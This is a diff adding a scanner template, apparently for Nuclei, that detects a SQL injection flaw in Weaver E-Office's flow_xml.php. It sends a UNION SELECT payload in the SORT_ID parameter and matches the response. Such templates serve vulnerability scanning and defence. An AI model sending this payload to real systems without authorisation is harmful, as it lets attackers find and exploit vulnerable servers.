@@ -1,0 +1,27 @@
+id: eoffice_flow_xml_sqli
+info:
+  name: 泛微E-Office flow_xml.php SQL注入漏洞
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: sqli
+http:
+  - raw:
+      - |+
+        GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(7)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: body
+        binary:
+          - 6520746578743d22e4ba8ce4bba3e59cb0e7a381e8af95e782b9e6a0b7e59381
+      - type: word
+        part: header
+        words:
+          - '200'
